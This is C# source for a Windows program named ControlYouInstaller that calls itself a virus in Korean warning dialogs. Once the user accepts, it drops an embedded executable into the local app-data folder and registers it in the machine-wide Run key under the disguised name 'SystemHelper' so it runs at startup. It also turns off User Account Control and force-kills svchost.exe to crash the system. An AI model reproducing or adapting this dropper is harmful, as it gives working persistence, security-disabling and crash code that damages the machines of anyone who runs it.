using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ControlYouInstaller
{
    public partial class Form1 : Form
    {

        string installDir = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\";

        public Form1()
        {
            InitializeComponent();

            this.Opacity = 0;
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            if (MessageBox.Show("이 프로그램은 바이러스입니다. 실행하시겠습니까?", "", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
            {
                if (MessageBox.Show("마지막 경고입니다. 실행하시겠습니까?", "", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == DialogResult.Yes)
                {

                    File.WriteAllBytes(installDir + "\\952b4yr49wbwk3-tmp.exe", ControlYouInstaller.Properties.Resources.ControlYou);

                    RegistryKey rk = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
                    rk.SetValue("SystemHelper", installDir + "\\952b4yr49wbwk3-tmp.exe");

                    RegistryKey rk2 = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", true);
                    rk2.SetValue("EnableLUA", 0);

                    Process bsod = new Process();
                    bsod.StartInfo.FileName = "C:\\Windows\\System32\\cmd.exe";
                    bsod.StartInfo.Arguments = "/C taskkill /f /im svchost.exe";
                    bsod.Start();

                }
                else
                {
                    Application.Exit();
                }
            }
            else {
                Application.Exit();
            }
        }
    }
}
